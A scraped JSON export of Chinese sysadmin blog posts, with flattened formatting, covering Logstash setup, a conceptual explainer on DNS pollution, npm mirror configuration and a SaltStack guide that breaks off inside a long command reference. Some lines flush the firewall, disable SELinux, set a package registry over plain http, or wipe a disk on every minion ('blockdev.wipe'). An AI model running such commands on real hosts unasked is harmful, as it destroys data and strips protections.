log output to a file you can set the path below.# This will also turn off the STDOUT log output.# log_file: ./kibana.log# Plugins that are included in the build, and no longer found in the plugins/ folderbundled_plugin_ids:- plugins/dashboard/index- plugins/discover/index- plugins/doc/index- plugins/kibana/index- plugins/markdown_vis/index- plugins/metric_vis/index- plugins/settings/index- plugins/table_vis/index- plugins/vis_types/index- plugins/visualize/index 安装Logstash客户端：系统centos 6.7 ip:192.168.1.235 rpm安装12345678#下载rpm包wget https://download.elastic.co/logstash/logstash/packages/centos/logstash-1.5.4-1.noarch.rpm#安装yum localinstall logstash-1.5.4-1.noarch.rpm这里修改下hosts：vim /etc/hosts127.0.0.1 tomcat_A1 源码安装123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354我这里源码包安装# wget https://download.elasticsearch.org/logstash/logstash/logstash-1.5.1.tar.gz#curl -O https://download.elastic.co/logstash/logstash/logstash-1.5.4.tar.gz#tar -zxvf logstash-1.5.1.tar.gz#mv logstash-1.5.1 /usr/local/#ln -s /usr/local/logstash-1.5.1/ /usr/local/logstash下载启动脚本生产都是运行在后台的，我这里源码安装没有init脚本启动。 去Github下载 https://github.com/benet1006/ELK_config.git#cp logstash.init /etc/init.d/logstash#chmod +x /etc/init.d/logstash这个脚本我做过修改。#启动logstash服务service logstash startservice logstash status#查看5000端口netstat -nltpActive Internet connections (only servers)Proto Recv-Q Send-Q Local Address Foreign Address State PID/Program nametcp 0 0 0.0.0.0:9200 0.0.0.0:* LISTEN 1765/javatcp 0 0 0.0.0.0:9300 0.0.0.0:* LISTEN 1765/javatcp 0 0 0.0.0.0:9301 0.0.0.0:* LISTEN 2309/javatcp 0 0 0.0.0.0:22 0.0.0.0:* LISTEN 1509/sshdtcp 0 0 0.0.0.0:5601 0.0.0.0:* LISTEN 1876/nodetcp 0 0 0.0.0.0:5000 0.0.0.0:* LISTEN 2309/javatcp 0 0 :::22 :::* LISTEN 1509/sshd修改启动脚本vim /etc/init.d/logstash 指定的目录自己源码安装的路径。name=logstashpidfile=\"/var/run/$name.pid\"export CLASSPATH=.:$JAVA_HOME/jre/lib/rt.jar:$JAVA_HOME/lib/dt.jar:$JAVA_HOME/lib/tools.jarexport PATH=$PATH:$JAVA_HOME/binLS_USER=logstashLS_GROUP=logstashLS_HOME=/usr/local/logstash 安装路径LS_HEAP_SIZE=\"1000m\"LS_JAVA_OPTS=\"-Djava.io.tmpdir=$&#123;LS_HOME&#125;\"LS_LOG_DIR=/usr/local/logstashLS_LOG_FILE=\"$&#123;LS_LOG_DIR&#125;/$name.log\"LS_CONF_FILE=/etc/logstash.conf 收集日志的规则confLS_OPEN_FILES=16384LS_NICE=19LS_OPTS=\"\"https://www.elastic.co/guide/en/logstash/current/plugins-inputs-file.html这个是log stash的官方文档的配置说明。这个配置说明上面我先修改下我之前的配置文件。 logstash测试：1234将logstash.ooxx.com换成你自己的域名。同时，到域名解析那添加elk.ooxx.com的A记录。使用那种方式都行，不过如果logstash服务端的IP地址变换了，证书不可用了。这里查看日志有主机名返回不然就跟下面一样 host：0.0.0.0 1＃/usr/local/logstash/bin/logstash -e 'input &#123; stdin&#123; &#125; &#125; output &#123; stdout&#123;codec =&gt; rubydebug&#125; &#125;' 123456789101112131415161718192021配置log stash－实现系统日志收集inputvim /etc/logstash.conf 这里我们之间先创建一个.conf 我们写在／etc/ 编写好以后让logstash去调用。 input &#123; stdin &#123; &#125; &#125; output &#123; elasticsearch &#123; host =&gt; \"192.168.1.234\" protocol =&gt; \"http\" &#125; stdout &#123; codec =&gt; rubydebug &#125; &#125;然后在用logstash去调用/usr/local/logstash/bin/logstash -f /etc/logstash.conf vim /etc/logstash.conf 官方文档file的配置文件和类型。官方文档下面还有个这个从头读到尾这样规定，这个非常好，这里我在做修改。 1234567然后在启动log stash脚本.# /etc/init.d/logstash start## ps -ef | grep logstash启动完了以后在查看下／var/log/messages 然后在登陆到 http://192.168.1.234:9200/_plugin/head/ 扩展阅读CentOS 7.x安装ELK(Elasticsearch+Logstash+Kibana) Centos 6.5 安装nginx日志分析系统 elasticsearch + logstash + redis + kibana logstash-forwarder and grok examples```","raw":null,"content":null,"categories":[{"name":"日志分析平台","slug":"日志分析平台","permalink":"http://blog.yangcvo.me/categories/日志分析平台/"}],"tags":[{"name":"Log analysis platform","slug":"Log-analysis-platform","permalink":"http://blog.yangcvo.me/tags/Log-analysis-platform/"}]},{"title":"DNS服务器主从复制搭建","slug":"DNS/DNS安全章－DNS污染 ","date":"2015-12-29T03:33:07.000Z","updated":"2017-03-16T06:19:17.000Z","comments":true,"path":"2015/12/29/DNS/DNS安全章－DNS污染 /","link":"","permalink":"http://blog.yangcvo.me/2015/12/29/DNS/DNS安全章－DNS污染 /","excerpt":"","text":"一 、什么是DNS污染 就是客户端发起正常的一次DNS请求，得到的确是一个异常或者不真实的DNS信息。一般造成这样的情况，很有可能DNS信息在某个环节被通过某种方式篡改。 二、有什么手段可以造成DNS污染 主要的方式，可以归纳为如下两种： 方式一、攻击者监测到DNS查询的请求报文时，伪装成DNS服务器向发出请求主机发送响应报文。因为DNS报文通常是无连接的UDP报文，没有确认机制，源主机不能识别出这个报文并非出自DNS服务器。攻击者并不需要丢弃真正DNS服务器发回来的响应报文，因为DNS的机制会导致源主机只接受最先到达的响应报文（甚至不管是谁发的）而忽略后继到达的其他报文。这样，源主机得到的就是攻击者伪造的域名解析结果。 条件：1、攻击者能截获客户的数据包。2、能最短时间接替返回消息 方式二、本地DNS服务器的缓存已受到污染，里面缓存的是错误的结果。DNS服务器通常将DNS查询的结果缓存在本地一段时间，这本意是为了减少重复DNS查询，从而降低DNS报文占用的网络带宽。可如果某次DNS查询的结果受到污染，则后继一段时间内向该DNS服务器查询的结果都会受到污染。 条件：1、本地DNS存在攻击漏洞 2、本地DNS成为被污染的对象 三、如何测试DNS信息受到污染 我们可以拿访问google 、facebook来演示： 123456789101112131415161718192021222324252627282930313233343536373839404142434445root@imoocc.com:/opt# nslookup www.google.com 8.8.8.8 #使用NDS8.8.8.8 解析 www.google.comServer:8.8.8.8Address:8.8.8.8#53 Non-authoritative answer:Name:www.google.comAddress: 37.61.54.158 root@imoocc.com:/opt# nslookup -vc www.google.com 8.8.8.8 #同样，不过改使用TCP的方式解析Server:8.8.8.8Address:8.8.8.8#53 Non-authoritative answer:Name:www.google.comAddress: 216.58.221.228＃我们再同样查查脸书root@imoocc.com:/opt# nslookup www.facebook.com 8.8.8.8Server:8.8.8.8Address:8.8.8.8#53 Non-authoritative answer:Name:www.facebook.comAddress: 37.61.54.158 #发现什么了？DNS受到了污染。 我们仔细来查查这个什么玩意地址37.61.54.158 下面是一个正常的Google地址返回，因该如下：","raw":null,"content":null,"categories":[{"name":"Linux","slug":"Linux","permalink":"http://blog.yangcvo.me/categories/Linux/"}],"tags":[{"name":"DNS","slug":"DNS","permalink":"http://blog.yangcvo.me/tags/DNS/"}]},{"title":"npm翻墙加速国内镜像","slug":"npm/npm翻墙加速国内镜像","date":"2015-12-21T06:51:19.000Z","updated":"2017-03-16T06:16:23.000Z","comments":true,"path":"2015/12/21/npm/npm翻墙加速国内镜像/","link":"","permalink":"http://blog.yangcvo.me/2015/12/21/npm/npm翻墙加速国内镜像/","excerpt":"","text":"问题Node.js 的依赖包管理生态系统 npm, 是世界上最大的生态系统开源库。 但国内使用 npm 来安装软件，速度很慢，有时候甚至直接就失败了！比如我安装stf就需要翻墙或者VPN去安装，可是就一直卡着。 原因npm 默认是从国外的源获取和下载包信息，不慢才怪，有时甚至被墙，导致无法正常安装软件。 解决可以采用国内的 npm 镜像来解决网速慢的问题。这里以“淘宝 NPM 镜像”举例。淘宝 NPM 镜像这是一个完整 npmjs.org 镜像，你可以用此代替官方版本(只读)，同步频率目前为 10分钟 一次以保证尽量与官方服务同步，镜像地址为 registry.npm.taobao.org， 是从 registry.npmjs.org 进行全量同步的。 方法1：使用 –registry在安装软件时，使用 –registry 来注册镜像地址到国内的镜像 如： 1npm install gitbook-cli -g --registry=http://registry.npm.taobao.org 这样，安装软件速度会很快哦。 方法2：设置 registry方法1 是每次使用都需要注册镜像源，未免繁琐。设置国内的镜像为默认镜像源，则更为方便： 1npm config set registry=http://registry.npm.taobao.org 方法3：使用 cnpm1cnpm 是 npm 中国镜像的 npm 客户端，可以代替 npm。 先用 npm 安装 cnpm： 1npm install -g cnpm --registry=https://registry.npm.taobao.org 而后，安装软件就能直接用 cnpm 代替 npm 了： 1cnpm install [name] 参考 http://npm.taobao.org/ https://nodejs.org/docs/latest-v0.12.x/api/","raw":null,"content":null,"categories":[],"tags":[{"name":"node.js","slug":"node-js","permalink":"http://blog.yangcvo.me/tags/node-js/"},{"name":"npm","slug":"npm","permalink":"http://blog.yangcvo.me/tags/npm/"}]},{"title":"自动化运维工具-服务自动化部署平台之Saltstack总结","slug":"自动化+可视化/saltstack/服务自动化部署平台之Saltstack总结","date":"2015-12-10T09:56:03.000Z","updated":"2017-03-29T11:41:27.000Z","comments":true,"path":"2015/12/10/自动化+可视化/saltstack/服务自动化部署平台之Saltstack总结/","link":"","permalink":"http://blog.yangcvo.me/2015/12/10/自动化+可视化/saltstack/服务自动化部署平台之Saltstack总结/","excerpt":"","text":"服务自动化部署平台之Saltstack总结Saltstack是一个新的基础设施管理工具。目前处于快速发展阶段，可以看做是强化的Func+弱化的Puppet的组合。间接的反映出了saltstack的两大功能：远程执行和配置管理。 SaltStack 保持了输入、输出、配置文件的一致性，所有文件均使用YAML格式。主要负责配置管理和远程执行（在远程主机运行预定义或任意的命令，也叫远程执行，这是 Salt的核心功能。接下来的链接展示了模块（module）和返回器（returner），这是远程执行的关键所在。） Salt是基于python写的经典C/S框架的自动化部署平台。由Master和Minion构成，通过ZeroMQ进行通信。 Master与Minion认证 1.minion 在第一次启动时，会在/etc/salt/pki/minion/（该路径在/etc/salt/minion里面设置）下自动生成 minion.pem(private key)和minion.pub(public key)，然后将minion.pub发送给master。 2.master 在接收到minion的public key后，通过salt-key命令accept minion public key，这样在master的/etc/salt/pki/master/minions下的将会存放以minion id命名的public key, 然后master就能对minion发送指令了。 Master与Minion的连接 Saltstack master启动后默认监听4505和4506两个端口。4505(publish_port)为salt的消息发布系统，4506(ret_port) 为salt客户端与服务端通信的端口。如果使用lsof查看4505端口，会发现所有的Minion在4505端口持续保持在ESTABLISHED 参考文档: http://blog.javachen.com/2013/11/18/study-note-of-saltstack/ 经典搭建框架http://www.linuxyw.com/179.html salt搭建参考 http://blog.halfss.com/blog/2013/05/22/yun-wei-zi-dong-hua-zhi-saltxue-xi-bi-ji/ salt的安装： master端： 1234567891011121314151617181920212223242526272829303132333435363738394041424344#yum install salt-master -y salt主控端安装#vim /etc/salt/master salt主配置文件修改interface: 服务监听IPauto_accept: True（可选，key通过‘salt-key -a keyname’命令手动进行认证）注意：keyname 就是客户端中设置的id标识(可以查看salt-minion端的配置)#salt-master -l debug debug模式，查看salt都进行哪些操作#/etc/init.d/salt-master restart 重启salt服务#/etc/init.d/salt-master status 查看状态#netstat -antlp | grep 4505 确保消息发布端口正常#netstat -antlp | grep 4506 确保客户端与服务端通信端口正常#/etc/init.d/salt-master restart# /etc/init.d/salt-master status# salt-key 查看认证相关信息# salt-key -a wy-pe2 手动添加认证key(给wy-pe2主机添加认证)#iptables -F 关闭防火墙以免影响认证#salt-key -a wy-pe2#salt-key -L 查看认证信息(会有显示已经认证和未认证的相关信息)[root@wy-pe1 ~]# salt-key -LAccepted Keys:wy-pe2 已经允许的key(表示wy-pe2已经允许认证了)Unaccepted Keys:Rejected Keys:#cd /etc/salt/pki/master/minions 在master中的minions目录中生成认证的key#setenforce 0 暂时关闭selinux#/etc/init.d/salt-master restart执行远程命令(使用salt内建的模块):#salt ‘wy-pe2′ test.ping 测试master和minion进行通信(在master端进行ping响应测试)[root@wy-pe1 ~]# salt ‘wy-pe2′ test.ping 如果能ping通，则为Truewy-pe2:True#lsof -i:4505 查看到minion端都和4505保持建立[root@wy-pe1 ~]# lsof -i:4505COMMAND PID USER FD TYPE DEVICE SIZE/OFF NODE NAMEsalt-mast 8568 root 12u IPv4 63217 0t0 TCP *:4505 (LISTEN)salt-mast 8568 root 14u IPv4 65101 0t0 TCP wy-pe1:4505-&gt;wy-pe2:51237 (ESTABLISHED)(表示建立连接了)注意:如果认证那块没做好，就会影响相关的链接 Salt客户端安装： minion端安装配置： 12345678910111213141516171819202122232425#yum install salt-minion -y#vim /etc/salt/minion 修改minion客户端主配置master: 服务端主机名id: 客户端主机名(其实也就是认证key的名字) 用来和master进行认证#/etc/init.d/salt-minion restart 重启服务#cd /etc/salt/pki/minion/ 在这个目录底下会生成两个认证文件(minion.pub minion.pem)salt-minion端不能正常启动的解决步骤:（一般就是iptables和selinux的影响）#/etc/init.d/salt-minion restart# tail -f /var/log/messages#/etc/init.d/salt-minion restart#iptables -F#tail -f /var/log/salt/minion#salt-minion -l debug#setenforce 0#/etc/init.d/salt-minion restart安装完毕，在master和minion认证完毕之后会在minion主机上的/etc/salt/pki/minion/目录底下生成新的minion_master.pub问题1：档master和minion进行认证的时候，master没有接收到public key(minion)(这个在后来的链接过程中会造成master和minion不能链接)问题2：辅机salt-minion总是在查看服务状态的时候显示失败(but pid exits！)# salt-minion -l debug 查看salt客户端详细信息 salt的简单使用：12345salt可以直接让minion执行模块命令，也可以直接执行shell命令1.salt -C ‘wy-pe1 and wy-pe2 or wy-peN’ test.ping -C表示多参数(表示在测试多台主机的存活状态)# salt ‘*’ disk.usage 查看磁盘使用情况(使用内建模块查看所有minion端的磁盘使用情况)#salt ‘*’ cmd.run ‘df -h’ 使用cmd.run直接调用远程shell命令(功能同上)# salt ‘*’ cmd.run “cat /root/lall” 查看客户端主机的/root/lall文件 2.nodegroup对minion进行分组：123456789nodegroups:group1: ‘L@foo.domain.com,bar.domain.com,baz.domain.com or bl*.domain.com’group2: ‘G@os :Debian and foo.domain.com’group3:’wy-pe2′进行分组测试：# salt -N group3 test.pingwy-pe2:True 3.grains对minion基本信息的管理：12salt ‘wy-pe2′ grins.ls 查看grains分类salt ‘wy-pe2′ grins.items 查看minnon基本信息(硬件参数) ###4.pillar对敏感信息的管理，只有匹配到的节点才能获取和使用 1234567891011121314151617181920212223242526272829303132默认pillar数据定义文件存储路径:/srv/pillar状态管理：1.salt基于minion进行状态的管理(state)类似于pupet的pp文件功能，salt的state文件扩展文件名为.sls,采用的是和puppet一样的设计思路。即以master端的文件状态来确定minion端的一些状态信息设置。(安装的软件包，服务的运行状态以及需要同步的文件配置)注意：salt默认的根目录在/srv/salt中，如果没有需要进行建立。top.sls：这个文件类似于puppet的site.pp文件，作为“最高同步”操作的入口文件，执行“最高同步”操作时，将从此sls文件中获取状态对minion进行同步示例：(注意，salt文件完全采用ymal格式，对代码的缩进有着严格的要求)#vim /srv/salt/servers_package.slshttpd: 项目名pkg: 类型– installed 动作(表示安装httpd包)service:– running– enable:Truevim-enhanced:pkg:– installedtomcat环境openjdk-7-jdk:pkg:– installedtomcat7:pkg:– installed– require:– pkg: openjdk-7-jdk# salt ‘wy-pe2′ state.sls servers_package 按照sls文件中的配置对wy-pe2进行服务配置 管理配置文件123456789101112131415161718192021222324252627282930313233343536373839httpd:pkg:– installedfile.managed: 文件管理(文件同步操作)– name: /etc/httpd/conf/httpd.conf– source: salt://httpd/httpd.conf# salt ‘wy-pe2′ state.highstate 应用修改(给minion永久添加状态)3.使用salt schedule对minion进行实时更新，让minion自觉的保持某个状态4.实时管理有时候我们需要临时的查看某个机器上的某个文件，或者执行某个命令cmd.run方式：(salt ‘$targeting’ cmd.run ‘$cmd’)用来远程执行shell命令# salt ‘wy-pe2′ cmd.run ‘ifconfig eth0′ 查看某台主机的网络接口cmd.script方式：可以向远程主机执行脚本#salt ‘*’ cmd.script salt://useradd.sh 向minion主机上执行useradd.sh脚本(salt://是salt的默认发布目录，即/srv/salt)pkg.install方式：制定主机安装软件#salt ‘wy-pe2′ pkg.install vsftpd 指定主机安装软件# salt ‘*’ network.interfaces 查看远程主机接口# salt-cp ‘wy-pe2′ salt-cmd /home/xxb2 复制文件到指定的系统上(当前目录的salt-cmd)salt是主命令，一般用来执行命令模块。salt-cp用来复制文件到制定的系统上去salt-key用来和minion之间进行身份验证salt-master为服务端的主守护进程用于控制minionsalt-run为前端命令执行module方式：(模块查看方式#salt ‘*’ sys.doc)#salt ‘*’ disk.usage 查看磁盘使用情况# salt ‘*’ grains.item os/osrelease/oscodename# salt ‘*’ user(group).info xxb2# salt ‘*’ ip.get_interface eth0#salt ‘*’ lvm.vgdisplay salt相关管理命令：12345salt-run manage.up 查看存活的minionsalt-run manage.down 查看死掉的minionsalt-run manage.down removekeys=True 查看down掉的minion，并将其删除salt-run manage.status 查看minion的相关状态salt-run manage.versions 查看slat的所有master和minion的版本信息 附录：salt详细使用命令12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394959697989910010110210310410510610710810911011111211311411511611711811912012112212312412512612712812913013113213313413513613713813914014114214314414514614714814915015115215315415515615715815916016116216316416516616716816917017117217317417517617717817918018118218318418518618718818919019119219319419519619719819920020120220320420520620720820921021121221321421521621721821922022122222322422522622722822923023123223323423523623723823924024124224324424524624724824925025125225325425525625725825926026126226326426526626726826927027127227327427527627727827928028128228328428528628728828929029129229329429529629729829930030130230330430530630730830931031131231331431531631731831932032132232332432532632732832933033133233333433533633733833934034134234334434534634734834935035135235335435535635735835936036136236336436536636736836937037137237337437537637737837938038138238338438538638738838939039139239339439539639739839940040140240340440540640740840941041141241341441541641741841942042142242342442542642742842943043143243343443543643743843944044144244344444544644744844945045145245345445545645745845946046146246346446546646746846947047147247347447547647747847948048148248348448548648748848949049149249349449549649749849950050150250350450550650750850951051151251351451551651751851952052152252352452552652752852953053153253353453553653753853954054154254354454554654754854955055155255355455555655755855956056156256356456556656756856957057157257357457557657757857958058158258358458558658758858959059159259359459559659759859960060160260360460560660760860961061161261361461561661761861962062162262362462562662762862963063163263363463563663763863964064164264364464564664764864965065165265365465565665765865966066166266366466566666766866967067167267367467567667767867968068168268368468568668768868969069169269369469569669769869970070170270370470570670770870971071171271371471571671771871972072172272372472572672772872973073173273373473573673773873974074174274374474574674774874975075175275375475575675775875976076176276376476576676776876977077177277377477577677777877978078178278378478578678778878979079179279379479579679779879980080180280380480580680780880981081181281381481581681781881982082182282382482582682782882983083183283383483583683783883984084184284384484584684784884985085185285385485585685785885986086186286386486586686786886987087187287387487587687787887988088188288388488588688788888989089189289389489589689789889990090190290390490590690790890991091191291391491591691791891992092192292392492592692792892993093193293393493593693793893994094194294394494594694794894995095195295395495595695795895996096196296396496596696796896997097197297397497597697797897998098198298398498598698798898999099199299399499599699799899910001001100210031004100510061007100810091010101110121013101410151016101710181019102010211022102310241025102610271028102910301031103210331034salt ‘*’ acl.delfacl user myuser /tmp/house/kitchensalt ‘*’ acl.delfacl default:group mygroup /tmp/house/kitchensalt ‘*’ acl.delfacl d:u myuser /tmp/house/kitchensalt ‘*’ acl.delfacl g myuser /tmp/house/kitchen /tmp/house/livingroomsalt ‘*’ acl.getfacl /tmp/house/kitchensalt ‘*’ acl.getfacl /tmp/house/kitchen /tmp/house/livingroomsalt ‘*’ acl.addfacl user myuser rwx /tmp/house/kitchensalt ‘*’ acl.addfacl default:group mygroup rx /tmp/house/kitchensalt ‘*’ acl.addfacl d:u myuser 7 /tmp/house/kitchensalt ‘*’ acl.addfacl g mygroup 0 /tmp/house/kitchen /tmp/house/livingroomsalt ‘*’ acl.versionsalt ‘*’ acl.wipefacls /tmp/house/kitchensalt ‘*’ acl.wipefacls /tmp/house/kitchen /tmp/house/livingroomsalt ‘*’ aliases.get_target aliassalt ‘*’ aliases.has_target alias targetsalt ‘*’ aliases.list_aliasessalt ‘*’ aliases.rm_alias aliassalt ‘*’ aliases.set_target alias targetsalt ‘*’ alternatives.auto namesalt ‘*’ alternatives.check_installed name pathsalt ‘*’ alternatives.display editorsalt ‘*’ alternatives.install editor /usr/bin/editor /usr/bin/emacs23 50salt ‘*’ alternatives.remove name pathsalt ‘*’ alternatives.set name pathsalt ‘*’ alternatives.show_current editorsalt ‘*’ apache.config /etc/httpd/conf.d/ports.conf config=”[&#123;‘Listen': ’22’&#125;]”salt ‘*’ apache.directivessalt ‘*’ apache.fullversionsalt ‘*’ apache.modulessalt ‘*’ apache.server_statussalt ‘*’ apache.server_status other-profilesalt ‘*’ apache.servermodssalt ‘*’ apache.signal restartsalt ‘*’ apache.useradd /etc/httpd/htpasswd larry badpasswordsalt ‘*’ apache.useradd /etc/httpd/htpasswd larry badpass opts=nssalt ‘*’ apache.userdel /etc/httpd/htpasswd larrysalt ‘*’ apache.versionsalt ‘*’ archive.gunzip template=jinja /tmp/&#123;&#123;grains.id&#125;&#125;.txt.gzsalt ‘*’ archive.gunzip /tmp/sourcefile.txt.gzsalt ‘*’ archive.gzip template=jinja /tmp/&#123;&#123;grains.id&#125;&#125;.txtsalt ‘*’ archive.gzip /tmp/sourcefile.txtsalt ‘*’ archive.rar template=jinja /tmp/rarfile.rar ‘/tmp/sourcefile1,/tmp/&#123;&#123;grains.id&#125;&#125;.txt’salt ‘*’ archive.rar /tmp/rarfile.rar /tmp/sourcefile1,/tmp/sourcefile2salt ‘*’ archive.tar cjvf /tmp/salt.tar.bz2 &#123;&#123;grains.saltpath&#125;&#125; template=jinjasalt ‘*’ archive.tar cjvf /tmp/tarfile.tar.bz2 /tmp/file_1,/tmp/file_2salt ‘*’ archive.tar xf foo.tar dest=/target/directorysalt ‘*’ archive.unrar template=jinja /tmp/rarfile.rar /tmp/&#123;&#123;grains.id&#125;&#125;/ excludes=file_1,file_2salt ‘*’ archive.unrar /tmp/rarfile.rar /home/strongbad/ excludes=file_1,file_2salt ‘*’ archive.unzip template=jinja /tmp/zipfile.zip /tmp/&#123;&#123;grains.id&#125;&#125;/ excludes=file_1,file_2salt ‘*’ archive.unzip /tmp/zipfile.zip /home/strongbad/ excludes=file_1,file_2salt ‘*’ archive.zip template=jinja /tmp/zipfile.zip /tmp/sourcefile1,/tmp/&#123;&#123;grains.id&#125;&#125;.txtsalt ‘*’ archive.zip /tmp/zipfile.zip /tmp/sourcefile1,/tmp/sourcefile2salt ‘*’ extfs.dump /dev/sda1salt ‘*’ blockdev.tune /dev/sda1 read-ahead=1024 read-write=Truesalt ‘*’ blockdev.wipe /dev/sda1salt ‘*’ bridge.add br0salt ‘*’ bridge.addif br0 eth0salt ‘*’ bridge.delete br0salt ‘*’ bridge.delif br0 eth0salt ‘*’ bridge.find_interfaces eth0 [eth1…]salt ‘*’ bridge.interfaces br0salt ‘*’ bridge.listsalt ‘*’ bridge.showsalt ‘*’ bridge.show br0salt ‘*’ bridge.stp br0 enablesalt ‘*’ bridge.stp br0 disablesalt ‘*’ bridge.stp bridge0 enable fxp0salt ‘*’ bridge.stp bridge0 disable fxp0salt ‘*’ buildout.bootstrap /srv/mybuildoutsalt ‘*’ buildout.buildout /srv/mybuildoutsalt ‘*’ buildout.run_buildout /srv/mybuildoutsalt ‘*’ buildout.upgrade_bootstrap /srv/mybuildoutsalt ‘*’ cloud.action start instance=myinstancesalt ‘*’ cloud.action stop instance=myinstancesalt ‘*’ cloud.action show_image provider=my-ec2-config image=ami-1624987fsalt ‘*’ cloud.destroy myinstancesalt ‘*’ cloud.full_querysalt ‘*’ cloud.list_images my-gce-configsalt ‘*’ cloud.list_locations my-gce-configsalt ‘*’ cloud.list_sizes my-gce-configsalt ‘*’ cloud.profile my-gce-config myinstancesalt ‘*’ cloud.querysalt ‘*’ cloud.query list_nodes_fullsalt ‘*’ cloud.query list_nodes_selectsalt ‘*’ cloud.select_querysalt ‘*’ cmd.exec_code ruby ‘puts “cheese”‘salt ‘*’ cmd.has_exec catsalt ‘*’ cmd.retcode “file /bin/bash”salt ‘*’ cmd.retcode template=jinja “file &#123;&#123;grains.pythonpath[0]&#125;&#125;/python”salt ‘*’ cmd.retcode “grep f” stdin=’one\\ntwo\\nthree\\nfour\\nfive\\n’salt ‘*’ cmd.run “ls -l | awk ‘/foo/&#123;print \\$2&#125;'”salt ‘*’ cmd.run template=jinja “ls -l /tmp/&#123;&#123;grains.id&#125;&#125; | awk ‘/foo/&#123;print \\$2&#125;'”salt ‘*’ cmd.run “Get-ChildItem C:\\ ” shell=’powershell’salt ‘*’ cmd.run “grep f” stdin=’one\\ntwo\\nthree\\nfour\\nfive\\n’salt ‘*’ cmd.run cmd=’sed -e s/=/:/g’salt ‘*’ cmd.run_all “ls -l | awk ‘/foo/&#123;print \\$2&#125;'”salt ‘*’ cmd.run_all template=jinja “ls -l /tmp/&#123;&#123;grains.id&#125;&#125; | awk ‘/foo/&#123;print \\$2&#125;'”salt ‘*’ cmd.run_all “grep f” stdin=’one\\ntwo\\nthree\\nfour\\nfive\\n’salt ‘*’ cmd.run_chroot /var/lib/lxc/container_name/rootfs ‘sh /tmp/bootstrap.sh’salt ‘*’ cmd.run_stderr “ls -l | awk ‘/foo/&#123;print \\$2&#125;'”salt ‘*’ cmd.run_stderr template=jinja “ls -l /tmp/&#123;&#123;grains.id&#125;&#125; | awk ‘/foo/&#123;print \\$2&#125;'”salt ‘*’ cmd.run_stderr “grep f” stdin=’one\\ntwo\\nthree\\nfour\\nfive\\n’salt ‘*’ cmd.run_stdout “ls -l | awk ‘/foo/&#123;print \\$2&#125;'”salt ‘*’ cmd.run_stdout template=jinja “ls -l /tmp/&#123;&#123;grains.id&#125;&#125; | awk ‘/foo/&#123;print \\$2&#125;'”salt ‘*’ cmd.run_stdout “grep f” stdin=’one\\ntwo\\nthree\\nfour\\nfive\\n’salt ‘*’ cmd.script salt://scripts/runme.shsalt ‘*’ cmd.script salt://scripts/runme.sh ‘arg1 arg2 “arg 3″‘salt ‘*’ cmd.script salt://scripts/windows_task.ps1 args=’ -Input c:\\tmp\\infile.txt’ shell=’powershell’salt ‘*’ cmd.script salt://scripts/runme.sh stdin=’one\\ntwo\\nthree\\nfour\\nfive\\n’salt ‘*’ cmd.script_retcode salt://scripts/runme.shsalt ‘*’ cmd.script_retcode salt://scripts/runme.sh stdin=’one\\ntwo\\nthree\\nfour\\nfive\\n’salt ‘*’ cmd.tty tty0 ‘This is a test’salt ‘*’ cmd.tty pts3 ‘This is a test’salt ‘*’ cmd.which catsalt ‘*’ cmd.which_bin ‘[pip2, pip, pip-python]’salt ‘*’ composer.install /var/www/applicationsalt ‘*’ composer.install /var/www/application no_dev=True optimize=Truesalt ‘*’ config.backup_modesalt ‘*’ config.dot_vals hostsalt ‘*’ config.get pkg:apachesalt ‘*’ config.manage_modesalt ‘*’ config.merge schedulesalt ‘*’ config.option redis.hostsalt ‘*’ config.valid_fileproto salt://path/to/filesalt ‘*’ cp.cache_dir salt://path/to/dirsalt ‘*’ cp.cache_dir salt://path/to/dir include_pat=’E@*.py$’salt ‘*’ cp.cache_file salt://path/to/filesalt ‘*’ cp.cache_files salt://pathto/file1,salt://pathto/file1salt ‘*’ cp.cache_local_file /etc/hostssalt ‘*’ cp.cache_mastersalt ‘*’ cp.get_dir salt://path/to/dir/ /minion/destsalt ‘*’ cp.get_file salt://path/to/file /minion/destsalt ‘*’ cp.get_file “salt://&#123;&#123;grains.os&#125;&#125;/vimrc” /etc/vimrc template=jinjasalt ‘*’ cp.get_file_str salt://my/filesalt ‘*’ cp.get_template salt://path/to/template /minion/destsalt ‘*’ cp.get_url salt://my/file /tmp/minesalt ‘*’ cp.get_url http://www.slashdot.org /tmp/index.htmlsalt ‘*’ cp.hash_file salt://path/to/filesalt ‘*’ cp.is_cached salt://path/to/filesalt ‘*’ cp.list_mastersalt ‘*’ cp.list_master_dirssalt ‘*’ cp.list_master_symlinkssalt ‘*’ cp.list_minionsalt ‘*’ cp.list_statessalt ‘*’ cp.push /etc/fstabsalt ‘*’ cp.push /usr/lib/mysqlsalt ‘*’ cp.push_dir /etc/modprobe.d/ glob=’*.conf’salt ‘*’ cron.list_tab rootsalt ‘*’ cron.list_tab rootsalt ‘*’ cron.raw_cron rootsalt ‘*’ cron.rm_job root /usr/local/weeklysalt ‘*’ cron.rm_job root /usr/bin/foo dayweek=1salt ‘*’ cron.rm_env root MAILTOsalt ‘*’ cron.rm_job root /usr/local/weeklysalt ‘*’ cron.rm_job root /usr/bin/foo dayweek=1salt ‘*’ cron.set_env root MAILTO user@example.comsalt ‘*’ cron.set_job root ‘*’ ‘*’ ‘*’ ‘*’ 1 /usr/local/weeklysalt ‘*’ cron.set_special root @hourly ‘echo foobar’salt ‘*’ cron.write_cron_file root /tmp/new_cronsalt ‘*’ cron.write_cron_file_verbose root /tmp/new_cronsalt ‘*’ daemontools.available foosalt ‘*’ daemontools.full_restart &lt;service name&gt;salt ‘*’ daemontools.get_allsalt ‘*’ daemontools.missing foosalt ‘*’ daemontools.reload &lt;service name&gt;salt ‘*’ daemontools.restart &lt;service name&gt;salt ‘*’ daemontools.start &lt;service name&gt;salt ‘*’ daemontools.status &lt;service name&gt;salt ‘*’ daemontools.stop &lt;service name&gt;salt ‘*’ daemontools.term &lt;service name&gt;salt ‘*’ data.cas &lt;key&gt; &lt;value&gt; &lt;old_value&gt;salt ‘*’ data.clearsalt ‘*’ data.dump ‘&#123;‘eggs': ‘spam’&#125;’salt ‘*’ data.getval &lt;key&gt;salt ‘*’ data.getvals &lt;key&gt; [&lt;key&gt; …]salt ‘*’ data.loadsalt ‘*’ data.update &lt;key&gt; &lt;value&gt;salt ‘*’ defaults.get core:users:rootsalt ‘*’ disk.blkidsalt ‘*’ disk.blkid /dev/sdasalt ‘*’ disk.inodeusagesalt ‘*’ disk.percent /varsalt ‘*’ disk.usagesalt ‘*’ django.collectstatic &lt;settings_module&gt;salt ‘*’ django.command 